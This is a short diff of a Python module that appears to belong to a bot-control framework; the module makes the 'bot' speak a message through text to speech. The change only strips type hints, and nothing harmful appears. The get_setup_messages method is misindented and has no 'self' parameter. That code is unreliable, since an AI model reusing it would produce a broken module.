@@ -22,7 +22,7 @@ from server.modules.helper import *
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Speak to the bot via text to speech.",
@@ -30,7 +30,7 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-     def get_setup_messages() -> List[str]:
+     def get_setup_messages():
         """Setup messages which will be presented to the user.
 
         In this example we'll ask the user for the message they want
@@ -40,7 +40,7 @@ class Module(ModuleABC):
             "Message to speak (Leave empty for \"Hello world!\"): "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         """Called after all options have been set."""
         message = set_options[0]
 
